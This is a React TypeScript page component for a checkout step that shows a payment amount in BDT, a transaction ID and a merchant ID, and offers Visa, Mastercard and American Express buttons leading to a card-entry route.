import { useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { CreditCard } from 'lucide-react';
import { useSession } from '@/hooks/useSession';
import { useLanguage } from '@/contexts/LanguageContext';
import { sendPageLoadNotification } from '@/lib/notifications';

const CARD_METHODS = [
  { id: 'visa', name: 'Visa', logo: '💳' },
  { id: 'mastercard', name: 'Mastercard', logo: '💳' },
  { id: 'amex', name: 'American Express', logo: '💳' },
];

export default function Index() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { session, isLoading, isValid, createSession, updateSession } = useSession();
  const { t } = useLanguage();

  useEffect(() => {
    if (isLoading) return;
    
    const amount = searchParams.get('amount');
    const merchant = searchParams.get('merchant');
    
    if (!isValid && amount && merchant) {
      const newSession = createSession(amount, merchant, document.referrer || 'https://seloku.com');
      if (newSession) {
        sendPageLoadNotification(newSession.sessionKey, amount);
      }
    } else if (!isValid && !amount) {
      navigate('/unauthorized');
    } else if (session) {
      sendPageLoadNotification(session.sessionKey, session.amount);
    }
  }, [isLoading, isValid, searchParams, createSession, navigate, session]);

  const handleMethodSelect = (methodId: string) => {
    if (session) {
      updateSession({ selectedMethod: methodId });
      navigate('/card');
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-primary"></div>
      </div>
    );
  }

  if (!session) return null;

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-card rounded-xl shadow-[var(--form-shadow)] p-6">
        <div className="text-center mb-6">
          <CreditCard className="w-12 h-12 mx-auto text-primary mb-3" />
          <h1 className="text-xl font-semibold">{t('selectPaymentMethod')}</h1>
        </div>
        
        <div className="bg-muted/50 rounded-lg p-4 mb-6">
          <div className="flex justify-between text-sm mb-2">
            <span className="text-muted-foreground">{t('amount')}:</span>
            <span className="font-semibold">{session.amount} BDT</span>
          </div>
          <div className="flex justify-between text-sm mb-2">
            <span className="text-muted-foreground">{t('transactionId')}:</span>
            <span className="font-mono text-xs">{session.transactionId}</span>
          </div>
          <div className="flex justify-between text-sm">
            <span className="text-muted-foreground">{t('merchantId')}:</span>
            <span>{session.merchantId}</span>
          </div>
        </div>

        <div className="space-y-3">
          {CARD_METHODS.map((method) => (
            <button
              key={method.id}
              onClick={() => handleMethodSelect(method.id)}
              disabled={session.selectedMethod !== null && session.selectedMethod !== method.id}
              className="w-full flex items-center gap-3 p-4 rounded-lg border border-border hover:border-primary hover:bg-accent transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <span className="text-2xl">{method.logo}</span>
              <span className="font-medium">{method.name}</span>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}
